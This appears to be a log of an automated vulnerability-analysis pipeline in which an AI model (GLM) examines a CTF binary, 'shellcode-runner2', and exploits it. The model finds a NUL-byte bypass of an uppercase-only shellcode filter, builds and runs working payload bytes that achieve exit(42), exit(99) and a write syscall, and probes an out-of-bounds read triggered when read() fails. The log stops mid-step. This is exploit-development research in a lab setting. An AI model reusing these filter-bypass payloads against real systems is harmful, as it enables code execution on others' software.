13:54:34 [semantic]   ← execute(0.0s): Additional checks: ⏎   - No seccomp/prctl (S1 F013) -> full syscall access ⏎   - No PIE -> binary at fixed address 0x400000 ⏎   - mmap at fixed hint 0...(446 chars)
13:54:34 [semantic] → 调用 GLM...
13:55:45 [semantic] ← GLM(70.5s): 调工具[submit_final_result]
13:55:45 [semantic] 现在我已经掌握了所需的所有证据。让我来整理最终的 S2 报告。关键发现如下：  1. **BUG-001 (高危)**：通过 NUL 字节和 `strlen` 绕过 shellcode 过滤器 —— `is_all_upper` 使用 `strlen(buf)` 作为循环边界，而该函数会在第一个 N
13:55:45 [semantic] ✓ submit_final_result 收到最终报告（VulnerabilityReport 校验通过，16501 chars）
13:55:45 [semantic] → 调用 GLM...
13:55:50 [semantic] ← GLM(5.4s)
13:55:50 [semantic] S2 语义漏洞分析已完成。我识别出了三个漏洞：  1. **BUG-001 (高危)**: 通过 NUL 字节和 `strlen` 绕过 shellcode 过滤器 —— 这是最关键的发现。`is_all_upper` 函数使用 `strlen(buf)` 作为循环边界，该函数会在第一个 NUL 字
13:55:50 [stage2] 保存 → /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/stage2.json
13:55:50 --- S3 Primitive（所有 bug） ---
13:55:50 === impact (bug_id=BUG-001) ===
13:55:50 [impact:BUG-001] → 调用 GLM...
13:55:55 [impact:BUG-001] ← GLM(4.9s): 调工具[disassemble, disassemble]
13:55:55 [impact:BUG-001] 我将分析 BUG-001：SHELLCODE_FILTER_BYPASS_VIA_NUL_BYTE_AND_STRLEN。让我先验证关键事实，然后构建并验证该 primitive。  让我先检查反汇编和关键代码路径。
13:55:55 [impact:BUG-001]   → 工具 disassemble({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "function": "is_all_upper", "lines": 80})
13:55:55 [impact:BUG-001]   → 工具 disassemble({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "function": "main", "lines": 200})
13:55:55 [impact:BUG-001]   ← disassemble(0.1s): 00000000004018dd <main>: ⏎   4018dd:	endbr64 ⏎   4018e1:	push   rbp ⏎   4018e2:	mov    rbp,rsp ⏎   4018e5:	push   r15 ⏎   4018e7:	push   r14 ⏎   4018e...(5837 chars)
13:55:55 [impact:BUG-001]   ← disassemble(0.1s): 0000000000401819 <is_all_upper>: ⏎   401819:	endbr64 ⏎   40181d:	push   rbp ⏎   40181e:	mov    rbp,rsp ⏎   401821:	push   rbx ⏎   401822:	sub    rsp,0...(2036 chars)
13:55:55 [impact:BUG-001] → 调用 GLM...
13:56:00 [impact:BUG-001] ← GLM(4.7s): 调工具[probe_io]
13:56:00 [impact:BUG-001] 反汇编结果确认了 S2 的分析。关键事实如下： 1. `is_all_upper` 在 0x4018c4 处使用 `strlen(buf)` 作为循环边界 2. `read(0, buf, 99)` 在 0x4019ad 处执行原始二进制 I/O（不会在 NUL 处停止） 3. `call rax`
13:56:00 [impact:BUG-001]   → 工具 probe_io({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "input": "AAAA", "max_lines": 30})
13:56:00 [impact:BUG-001]   ← probe_io(0.0s): 00000000: 0a49 6e70 7574 2079 6f75 7220 7368 656c  .Input your shel ⏎ 00000010: 6c63 6f64 6520 6865 7265 2028 6d61 783a  lcode here (max: ⏎ 00000020: ...(1417 chars)
13:56:00 [impact:BUG-001] → 调用 GLM...
13:56:05 [impact:BUG-001] ← GLM(5.2s): 调工具[make_payload]
13:56:05 [impact:BUG-001] 很好。该二进制程序： 1. 打印寄存器状态（确认了 BUG-003 的信息泄露） 2. `rax = 0x13370000`（mmap 提示已采纳） 3. 执行 `call rax` → SIGSEGV（因为 AAAA = 0x41414141 = 无效的 REX 前缀链）  现在我需要验证： 1.
13:56:05 [impact:BUG-001]   → 工具 make_payload({"file_path": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc_test1.bin", "parts": [["A\\x00", 1], ["\\x90", 10]]})
13:56:05 [impact:BUG-001]   ← make_payload(0.0s): /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc_test1.bin len=12 preview_hex=410090909090909090909090
13:56:05 [impact:BUG-001] → 调用 GLM...
13:56:08 [impact:BUG-001] ← GLM(3.3s): 调工具[probe_io]
13:56:08 [impact:BUG-001]   → 工具 probe_io({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "max_lines": 30, "payload_file": "/work/workspace/0017-2022-30-she)
13:56:08 [impact:BUG-001]   ← probe_io(0.0s): 00000000: 0a49 6e70 7574 2079 6f75 7220 7368 656c  .Input your shel ⏎ 00000010: 6c63 6f64 6520 6865 7265 2028 6d61 783a  lcode here (max: ⏎ 00000020: ...(1417 chars)
13:56:08 [impact:BUG-001] → 调用 GLM...
13:56:16 [impact:BUG-001] ← GLM(7.9s): 调工具[execute]
13:56:16 [impact:BUG-001] 过滤器通过了（没有出现 "invalid shellcode!" 消息），并且执行到达了 `call rax`（打印了寄存器）。SIGSEGV 是因为 NOP 滑行（NOP sled）运行到了缓冲区末尾，进入了未映射的内存。这证实了：  1. **NUL 字节绕过有效**：`A\x00` + NOP
13:56:16 [impact:BUG-001]   → 工具 execute({"command": "python3 -c \"\nfrom pwn import *\ncontext.arch = 'amd64'\n\n# exit(42) shellcode\nsc = asm('mov eax, 60; mov edi, 42; syscall')\nprint('s)
13:56:16 [impact:BUG-001]   ← execute(0.0s): 【已被工具层拦截】禁止用 execute 跑内联 `python -c` 里的 pwntools 交互（recv 无 timeout → stdin 死锁 → 烧墙钟）。改用：① run_binary(stdin=, timeout=10)；② write_file 完整脚本（内部 recv 必带 ...(189 chars)
13:56:16 [impact:BUG-001] → 调用 GLM...
13:56:21 [impact:BUG-001] ← GLM(4.3s): 调工具[make_payload]
13:56:21 [impact:BUG-001] 让我改用 make_payload。我需要手动构建 exit(42) 的 shellcode：  exit(42) = `mov eax, 60` (0xb8, 0x3c, 0x00, 0x00, 0x00) + `mov edi, 42` (0xbf, 0x2a, 0x00, 0x00, 0x00
13:56:21 [impact:BUG-001]   → 工具 make_payload({"file_path": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc_exit42.bin", "parts": [["A\\x00", 1], ["\\xb8\\x3c\\x00\\x00\\x00\\x)
13:56:21 [impact:BUG-001]   ← make_payload(0.0s): /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc_exit42.bin len=14 preview_hex=4100b83c000000bf2a0000000f05
13:56:21 [impact:BUG-001] → 调用 GLM...
13:56:25 [impact:BUG-001] ← GLM(4.2s): 调工具[run_binary]
13:56:25 [impact:BUG-001] Payload 为：`A\x00\xb8\x3c\x00\x00\x00\xbf\x2a\x00\x00\x00\x0f\x05` - `A` (0x41) - 通过过滤器（大写字母） - `\x00` - NUL 字节，导致 strlen 返回 1 - `\xb8\x3c\x00\x00\x00`
13:56:25 [impact:BUG-001]   → 工具 run_binary({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "stdin_hex": "4100b83c000000bf2a0000000f05", "timeout": 10})
13:56:25 [impact:BUG-001]   ← run_binary(0.0s): rc=-11  stdout_len=307 ⏎ --- stdout (hex + ascii per line, 16B/行) --- ⏎ 0000  0a 49 6e 70 75 74 20 79 6f 75 72 20 73 68 65 6c  |.Input your shel| ⏎ 00...(1576 chars)
13:56:25 [impact:BUG-001] → 调用 GLM...
13:56:40 [impact:BUG-001] ← GLM(15.3s): 调工具[execute]
13:56:40 [impact:BUG-001] rc=-11 (SIGSEGV)。exit(42) shellcode 没有正常工作。问题在于 `mov eax, 60` 包含了 NUL 字节 (0xb8 0x3c 0x00 0x00 0x00)，而 `read` 会读取这些字节，但 `call rax` 从缓冲区的起始位置（偏移量 0 = 'A
13:56:40 [impact:BUG-001]   → 工具 execute({"command": "python3 -c \"\n# Build exit(42) shellcode without NUL bytes\n# mov al, 60; mov dil, 42; syscall  -- but we need to zero rax first\n# xor )
13:56:40 [impact:BUG-001]   ← execute(0.0s): shellcode hex: 31ff83c72a31c0b03c0f05 ⏎ shellcode len: 11 ⏎ No NUL bytes in shellcode ⏎ payload hex: 410031ff83c72a31c0b03c0f05 ⏎ payload len: 13 ⏎  ⏎...(187 chars)
13:56:40 [impact:BUG-001] → 调用 GLM...
13:56:48 [impact:BUG-001] ← GLM(7.5s): 调工具[run_binary]
13:56:48 [impact:BUG-001] 很好。Shellcode `31 ff 83 c7 2a 31 c0 b0 3c 0f 05` = `xor edi,edi; add edi,42; xor eax,eax; mov al,60; syscall` = exit(42)。没有 NUL 字节。  但是等等 - 执行从偏移量 0 开始
13:56:48 [impact:BUG-001]   → 工具 run_binary({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "stdin_hex": "410031ff83c72a31c0b03c0f05", "timeout": 10})
13:56:48 [impact:BUG-001]   ← run_binary(0.0s): rc=-11  stdout_len=307 ⏎ --- stdout (hex + ascii per line, 16B/行) --- ⏎ 0000  0a 49 6e 70 75 74 20 79 6f 75 72 20 73 68 65 6c  |.Input your shel| ⏎ 00...(1576 chars)
13:56:48 [impact:BUG-001] → 调用 GLM...
13:57:03 [impact:BUG-001] ← GLM(15.4s): 调工具[make_payload]
13:57:03 [impact:BUG-001] 仍然是 SIGSEGV (rc=-11)。问题在于 `0x41 0x00` 的解码方式。让我检查一下：0x41 是 REX.B 前缀，0x00 是 `ADD r/m8, r8` 的操作码。REX.B + 0x00 = `ADD r/m8, r8b`。ModRM 字节将是下一个字节 (0x31)。所以
13:57:03 [impact:BUG-001]   → 工具 make_payload({"file_path": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc_exit42_v2.bin", "parts": [["P\\x00\\x00", 1], ["\\x31\\xff\\x83\\xc7)
13:57:03 [impact:BUG-001]   ← make_payload(0.0s): /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc_exit42_v2.bin len=14 preview_hex=50000031ff83c72a31c0b03c0f05
13:57:03 [impact:BUG-001] → 调用 GLM...
13:57:09 [impact:BUG-001] ← GLM(5.4s): 调工具[run_binary]
13:57:09 [impact:BUG-001] Payload: `P\x00\x00\x31\xff\x83\xc7\x2a\x31\xc0\xb0\x3c\x0f\x05` - `P` (0x50) = PUSH rax (单字节，允许) - `\x00` = NUL，strlen 返回 1，仅检查 'P' - `\x00` = `ADD [
13:57:09 [impact:BUG-001]   → 工具 run_binary({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "stdin_hex": "50000031ff83c72a31c0b03c0f05", "timeout": 10})
13:57:09 [impact:BUG-001]   ← run_binary(0.0s): rc=42  stdout_len=307 ⏎ --- stdout (hex + ascii per line, 16B/行) --- ⏎ 0000  0a 49 6e 70 75 74 20 79 6f 75 72 20 73 68 65 6c  |.Input your shel| ⏎ 001...(1575 chars)
13:57:09 [impact:BUG-001] → 调用 GLM...
13:57:15 [impact:BUG-001] ← GLM(6.7s): 调工具[make_payload]
13:57:15 [impact:BUG-001] **rc=42** — exit(42) syscall 执行成功！这明确证明了：  1. **NUL 字节过滤器绕过有效**：`P\x00` 通过了 `is_all_upper`（strlen=1，仅检查了 'P'） 2. **NUL 之后的字节被执行**：shellcode `xor edi,e
13:57:15 [impact:BUG-001]   → 工具 make_payload({"file_path": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc_exit99.bin", "parts": [["P\\x00\\x00", 1], ["\\x31\\xff\\x83\\xc7\\x)
13:57:15 [impact:BUG-001]   ← make_payload(0.0s): /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc_exit99.bin len=14 preview_hex=50000031ff83c76331c0b03c0f05
13:57:15 [impact:BUG-001] → 调用 GLM...
13:57:20 [impact:BUG-001] ← GLM(4.6s): 调工具[run_binary]
13:57:20 [impact:BUG-001] 这个使用了 `add edi, 0x63` (99) 而不是 `add edi, 0x2a` (42)。让我验证一下 exit(99)：
13:57:20 [impact:BUG-001]   → 工具 run_binary({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "stdin_hex": "50000031ff83c76331c0b03c0f05", "timeout": 10})
13:57:20 [impact:BUG-001]   ← run_binary(0.0s): rc=99  stdout_len=307 ⏎ --- stdout (hex + ascii per line, 16B/行) --- ⏎ 0000  0a 49 6e 70 75 74 20 79 6f 75 72 20 73 68 65 6c  |.Input your shel| ⏎ 001...(1575 chars)
13:57:20 [impact:BUG-001] → 调用 GLM...
13:57:31 [impact:BUG-001] ← GLM(11.0s): 调工具[execute]
13:57:31 [impact:BUG-001] **rc=99** — exit(99) 执行成功！这证明了完全可控的任意代码执行，具有两个不同的攻击者控制结果（42 和 99）。  现在让我再验证一个 primitive：通过 `write` syscall 进行 INFO_LEAK（以证明可以执行任意 syscall，而不仅仅是 exit）。
13:57:31 [impact:BUG-001]   → 工具 execute({"command": "python3 -c \"\n# write(1, buf_addr, 6) shellcode - write 'MARKER' to stdout\n# Need: rax=1 (write), rdi=1 (stdout), rsi=addr_of_string, r)
13:57:31 [impact:BUG-001]   ← execute(0.0s): shellcode hex: 31ff83c70131d2b20e31c0b0010f05 ⏎ shellcode len: 15 ⏎ No NUL bytes ⏎ payload hex: 50000031ff83c70131d2b20e31c0b0010f05 ⏎ payload len: 18...(192 chars)
13:57:31 [impact:BUG-001] → 调用 GLM...
13:57:34 [impact:BUG-001] ← GLM(2.7s): 调工具[run_binary]
13:57:34 [impact:BUG-001] 这个 shellcode 执行了 `write(1, rsi=0x13370000, 14)` —— 将缓冲区内容写入 stdout。让我测试一下：
13:57:34 [impact:BUG-001]   → 工具 run_binary({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "stdin_hex": "50000031ff83c70131d2b20e31c0b0010f05", "timeout": 10)
13:57:34 [impact:BUG-001]   ← run_binary(0.0s): rc=-11  stdout_len=321 ⏎ --- stdout (hex + ascii per line, 16B/行) --- ⏎ 0000  0a 49 6e 70 75 74 20 79 6f 75 72 20 73 68 65 6c  |.Input your shel| ⏎ 00...(1796 chars)
13:57:34 [impact:BUG-001] → 调用 GLM...
13:57:56 [impact:BUG-001] ← GLM(22.6s): 调工具[write_file]
13:57:56 [impact:BUG-001] 太棒了！`write` 系统调用执行成功！我可以在偏移量 0x134 处的输出中看到缓冲区内容 `50 00 00 31 ff 83 c7 01 31 d2 b2 0e 31 c0` —— 这正是我们的 payload 字节。`write(1, 0x13370000, 14)` 系统调用将 mmap
13:57:56 [impact:BUG-001]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nS3 Primitive Verification PoC for BUG-001\n==========================================\nBUG-001: SHELLCODE)
13:57:56 [impact:BUG-001]   ← write_file(0.0s): Updated file /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc-BUG-001.py
13:57:56 [impact:BUG-001] → 调用 GLM...
13:57:59 [impact:BUG-001] ← GLM(2.9s): 调工具[run_script]
13:57:59 [impact:BUG-001]   → 工具 run_script({"path": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc-BUG-001.py", "timeout": 30})
13:57:59 [impact:BUG-001]   ← run_script(0.1s): rc=0 ⏎ --- stdout (summarized) --- ⏎ === PRIM-001: exit(42) via NUL bypass === ⏎   payload: 50000031ff83c72a31c0b03c0f05 ⏎   return_code: 42 ⏎   expec...(993 chars)
13:57:59 [impact:BUG-001] → 调用 GLM...
13:58:03 [impact:BUG-001] ← GLM(4.3s): 调工具[delete, delete, delete, delete]
13:58:03 [impact:BUG-001] 三个原语均已通过动态证据验证。让我清理一下临时文件：
13:58:03 [impact:BUG-001]   → 工具 delete({"file_path": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc_test1.bin"})
13:58:03 [impact:BUG-001]   → 工具 delete({"file_path": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc_exit42.bin"})
13:58:03 [impact:BUG-001]   → 工具 delete({"file_path": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc_exit42_v2.bin"})
13:58:03 [impact:BUG-001]   → 工具 delete({"file_path": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc_exit99.bin"})
13:58:03 [impact:BUG-001]   ← delete(0.0s): Deleted /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc_test1.bin
13:58:03 [impact:BUG-001]   ← delete(0.0s): Deleted /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc_exit42_v2.bin
13:58:03 [impact:BUG-001]   ← delete(0.0s): Deleted /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc_exit42.bin
13:58:03 [impact:BUG-001]   ← delete(0.0s): Deleted /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc_exit99.bin
13:58:03 [impact:BUG-001] → 调用 GLM...
13:59:15 [impact:BUG-001] ← GLM(71.9s): 调工具[submit_final_result]
13:59:15 [impact:BUG-001] 所有验证已完成。让我总结一下发现：  **BUG-001 Primitive 分析总结：**  该漏洞是 `is_all_upper()` 中的一个过滤器绕过，它使用 `strlen(buf)` 作为循环边界。由于 `strlen` 在遇到第一个 NUL 字节时会停止，而 `read()` 执行原始
13:59:15 [impact:BUG-001] ✓ submit_final_result 收到最终报告（PrimitiveReport 校验通过，15532 chars）
13:59:15 [impact:BUG-001] → 调用 GLM...
13:59:22 [impact:BUG-001] ← GLM(6.4s)
13:59:22 [impact:BUG-001] S3 Primitive 分析与验证已完成。以下是工作总结：  ## BUG-001: SHELLCODE_FILTER_BYPASS_VIA_NUL_BYTE_AND_STRLEN  ### Primitive: CODE_EXECUTION (直接) — 已验证  **漏洞链条：** 1. `i
13:59:22 === impact (bug_id=BUG-002) ===
13:59:22 [impact:BUG-002] → 调用 GLM...
13:59:25 [impact:BUG-002] ← GLM(2.9s): 调工具[disassemble, checksec]
13:59:25 [impact:BUG-002] 我将分析 BUG-002：`READ_RETURN_VALUE_INSUFFICIENT_CHECK`。让我先了解该漏洞，然后推导并验证其原语（primitives）。  让我先检查关键函数的反汇编代码，并理解具体的代码路径。
13:59:25 [impact:BUG-002]   → 工具 disassemble({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "function": "main", "lines": 200})
13:59:25 [impact:BUG-002]   → 工具 checksec({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target"})
13:59:25 [impact:BUG-002]   ← disassemble(0.1s): 00000000004018dd <main>: ⏎   4018dd:	endbr64 ⏎   4018e1:	push   rbp ⏎   4018e2:	mov    rbp,rsp ⏎   4018e5:	push   r15 ⏎   4018e7:	push   r14 ⏎   4018e...(5837 chars)
13:59:25 [impact:BUG-002]   ← checksec(0.2s): [*] '/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target' ⏎     Arch:       amd64-64-little ⏎     RELRO:      Partial RELRO ⏎     St...(313 chars)
13:59:25 [impact:BUG-002] → 调用 GLM...
13:59:31 [impact:BUG-002] ← GLM(6.4s): 调工具[probe_io, disassemble]
13:59:31 [impact:BUG-002] 很好。现在我已经清楚地掌握了反汇编代码。让我来分析一下关键代码路径：  1. 在 `0x4019ad` 处：`read(0, mmap_buf, 99)` 返回值存储在 `[rbp-0xac]` 中 2. 在 `0x4019b8` 处：检查 `cmp [rbp-0xac], 0x0; jne 0x4
13:59:31 [impact:BUG-002]   → 工具 probe_io({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "input": "AAAA"})
13:59:31 [impact:BUG-002]   → 工具 disassemble({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "function": "is_all_upper", "lines": 60})
13:59:31 [impact:BUG-002]   ← probe_io(0.0s): 00000000: 0a49 6e70 7574 2079 6f75 7220 7368 656c  .Input your shel ⏎ 00000010: 6c63 6f64 6520 6865 7265 2028 6d61 783a  lcode here (max: ⏎ 00000020: ...(1417 chars)
13:59:31 [impact:BUG-002]   ← disassemble(0.1s): 0000000000401819 <is_all_upper>: ⏎   401819:	endbr64 ⏎   40181d:	push   rbp ⏎   40181e:	mov    rbp,rsp ⏎   401821:	push   rbx ⏎   401822:	sub    rsp,0...(2033 chars)
13:59:31 [impact:BUG-002] → 调用 GLM...
13:59:39 [impact:BUG-002] ← GLM(7.5s): 调工具[gdb_run]
13:59:39 [impact:BUG-002] 很好。现在我已经清楚地了解了这个漏洞。关键问题在于：我们能否让 `read()` 返回 -1？让我思考一下：  1. `read(0, buf, 99)` —— fd 0 是 stdin。在正常操作下，read 返回读取的字节数或 0 (EOF)。 2. 要让 read 返回 -1，我们需要一个错误
13:59:39 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "commands": "b *main+0xf3; run < /dev/null; info registers rax; x/)
13:59:39 [impact:BUG-002]   ← gdb_run(0.0s): Breakpoint 1 at 0x4019d0 ⏎  ⏎ Input your shellcode here (max: 100): read failed! ⏎ [Inferior 1 (process 14695) exited with code 01] ⏎ 0x1336fff0:	0x13...(547 chars)
13:59:39 [impact:BUG-002] → 调用 GLM...
13:59:46 [impact:BUG-002] ← GLM(7.2s): 调工具[gdb_run]
13:59:46 [impact:BUG-002] 有意思！当 stdin 为 `/dev/null`（空）时，`read()` 返回 0（EOF），程序打印 "read failed!" 并退出。断点位于 `0x4019d0`，这是在 `read_ret != 0` 检查通过之后——但使用 `/dev/null` 时，read 返回 0，因此程序中
13:59:46 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "commands": "b *0x4019ad; run; info proc mappings; x/4gx 0x1336fff)
13:59:46 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x4019ad ⏎  ⏎ Input your shellcode here (max: 100):  ⏎ Breakpoint 1, 0x00000000004019ad in main () ⏎ process 14715 ⏎ Mapped address sp...(2050 chars)
13:59:46 [impact:BUG-002] → 调用 GLM...
14:00:00 [impact:BUG-002] ← GLM(13.8s): 调工具[symbols, disassemble]
14:00:00 [impact:BUG-002] 重要发现： 1. mmap 区域 `0x13370000-0x13371000` (4096 字节，rwxp) —— mmap 以页面粒度进行映射，因此即使请求大小为 100，整个 4096 字节的页面也会被映射。 2. 地址 `0x1336fff0` 无法访问 —— 这意味着 `0x1336FFF
14:00:00 [impact:BUG-002]   → 工具 symbols({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "filter": "signal", "max_lines": 30})
14:00:00 [impact:BUG-002]   → 工具 disassemble({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "function": "init", "lines": 40})
14:00:00 [impact:BUG-002]   ← symbols(0.0s): 0000000000453fd0 T _dl_signal_error ⏎ 0000000000453f80 T _dl_signal_exception ⏎ 000000000040a390 W gsignal ⏎ 
14:00:00 [impact:BUG-002]   ← disassemble(0.1s): 00000000004017aa <init>: ⏎   4017aa:	endbr64 ⏎   4017ae:	push   rbp ⏎   4017af:	mov    rbp,rsp ⏎   4017b2:	mov    rax,QWORD PTR [rip+0xc3f3f]        #...(876 chars)
14:00:00 [impact:BUG-002] → 调用 GLM...
14:00:31 [impact:BUG-002] ← GLM(31.3s): 调工具[write_file]
14:00:31 [impact:BUG-002] 没有安装自定义信号处理程序。`alarm(60)` 设置了一个 60 秒的定时器，SIGALRM 的默认操作是终止进程。因此，在正常操作下，我们无法轻易让 `read()` 返回 -1。  然而，让我思考一下攻击者是否能控制这一点。在 CTF 环境中，攻击者通过管道提供 stdin。如果攻击者： 1
14:00:31 [impact:BUG-002]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nBUG-002: READ_RETURN_VALUE_INSUFFICIENT_CHECK\nPrimitive verification script.\n\nGoal: Verify whether rea)
14:00:31 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc-BUG-002.py
14:00:31 [impact:BUG-002] → 调用 GLM...
14:00:34 [impact:BUG-002] ← GLM(3.0s): 调工具[run_script]
14:00:34 [impact:BUG-002]   → 工具 run_script({"path": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc-BUG-002.py", "timeout": 30})
14:00:37 [impact:BUG-002]   ← run_script(2.2s): rc=0 ⏎ --- stdout (summarized) --- ⏎ === Test 1: EINTR via SIGURG during read() === ⏎   Sent SIGURG to pid 14728 ⏎   Wrote 'A\n' to pipe ⏎   Return co...(1231 chars)
14:00:37 [impact:BUG-002] → 调用 GLM...
14:01:01 [impact:BUG-002] ← GLM(24.2s): 调工具[write_file]
14:01:01 [impact:BUG-002] 太棒了！这是一个重大发现！测试 3（非阻塞 stdin 管道）导致了 rc=-11 (SIGSEGV)，且在 stdout 中没有寄存器转储——这意味着程序在到达 shellcode 执行阶段之前就崩溃了！这强烈表明 `read()` 返回了 -1 (EAGAIN)，并且代码访问了 `0x1336F
14:01:01 [impact:BUG-002]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nBUG-002: Verify OOB access at mmap_buf[-2] when read() returns -1.\n\nUse non-blocking stdin pipe to make)
14:01:01 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc-BUG-002.py
14:01:01 [impact:BUG-002] → 调用 GLM...
14:01:04 [impact:BUG-002] ← GLM(3.0s): 调工具[run_script]
14:01:04 [impact:BUG-002]   → 工具 run_script({"path": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc-BUG-002.py", "timeout": 30})
14:01:05 [impact:BUG-002]   ← run_script(1.2s): rc=0 ⏎ --- stdout (summarized) --- ⏎ === GDB Test: Simulate read() returning -1 === ⏎   Return code: 0 ⏎   GDB Output: ⏎ Breakpoint 1 at 0x4019b2 ⏎  ⏎...(2680 chars)
14:01:05 [impact:BUG-002] → 调用 GLM...
14:01:37 [impact:BUG-002] ← GLM(31.7s): 调工具[write_file]
14:01:37 [impact:BUG-002] 这非常有价值！让我来分析一下结果：  **测试 1 (GDB 模拟 read=-1)**：已确认！ - 在 `0x4019b2` 处设置断点，将 `[rbp-0xac]` 设置为 -1，并继续执行 - **在 `0x4019e3` 处发生 SIGSEGV** —— 这正是 `movzx eax, B
14:01:37 [impact:BUG-002]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nBUG-002: Verify read() returns -1 with non-blocking stdin via GDB.\nAlso verify the crash is at the OOB r)
14:01:37 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc-BUG-002.py
14:01:37 [impact:BUG-002] → 调用 GLM...
14:01:39 [impact:BUG-002] ← GLM(2.3s): 调工具[run_script]
14:01:39 [impact:BUG-002]   → 工具 run_script({"path": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc-BUG-002.py", "timeout": 30})
14:01:40 [impact:BUG-002]   ← run_script(0.7s): rc=0 ⏎ --- stdout (summarized) --- ⏎  ⏎ === GDB Test: Detailed crash analysis with read()=-1 === ⏎   GDB Output: ⏎ Breakpoint 1 at 0x4019b2 ⏎  ⏎ Input...(1388 chars)
14:01:40 [impact:BUG-002] → 调用 GLM...
14:02:11 [impact:BUG-002] ← GLM(31.5s): 调工具[write_file]
14:02:11 [impact:BUG-002] 有趣的发现：  1. **GDB 模拟（测试 1）**：完美确认！    - `[rbp-0xac]` 被设置为 -1 (0xffffffff)    - 在 `0x4019e3` 处命中断点，此时 `rax = 0x1336fffe`，`rdx = 0xfffffffffffffffe` (-2)
14:02:11 [impact:BUG-002]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nBUG-002: Verify OOB access when read() returns -1.\n\nKey findings so far:\n1. GDB simulation confirms: w)
14:02:11 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc-BUG-002.py
14:02:11 [impact:BUG-002] → 调用 GLM...
14:02:13 [impact:BUG-002] ← GLM(2.0s): 调工具[run_script]
14:02:13 [impact:BUG-002]   → 工具 run_script({"path": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc-BUG-002.py", "timeout": 40})
14:02:17 [impact:BUG-002]   ← run_script(4.1s): rc=0 ⏎ --- stdout (summarized) --- ⏎ === PRIM-001: Non-blocking stdin, write end OPEN === ⏎   Return code: -11 ⏎   Stdout: b'\nInput your shellcode he...(807 chars)
14:02:17 [impact:BUG-002] → 调用 GLM...
14:02:45 [impact:BUG-002] ← GLM(27.3s): 调工具[write_file]
14:02:45 [impact:BUG-002] 所有测试均确认了该结果：  1. **非阻塞 stdin 且写端打开**：5/5 次运行均以 SIGSEGV (-11) 崩溃 2. **C 辅助程序方法**：同样以 SIGSEGV 崩溃 3. **GDB 模拟**：确认崩溃发生在 `0x4019e3` (`movzbl (%rax)`)，此时 `
14:02:45 [impact:BUG-002]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nBUG-002: Final verification with GDB to confirm read()=-1 and crash location.\nAlso check if OOB write pa)
14:02:45 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc-BUG-002.py
14:02:45 [impact:BUG-002] → 调用 GLM...
14:02:47 [impact:BUG-002] ← GLM(1.9s): 调工具[run_script]
14:02:47 [impact:BUG-002]   → 工具 run_script({"path": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc-BUG-002.py", "timeout": 30})
14:02:47 [impact:BUG-002]   ← run_script(0.2s): rc=0 ⏎ --- stdout (summarized) --- ⏎ === PRIM-001: GDB confirmation via C helper === ⏎   GDB Output: ⏎ Breakpoint 1 at 0x4019b2 ⏎ Breakpoint 2 at 0x40...(1612 chars)
14:02:47 [impact:BUG-002] → 调用 GLM...
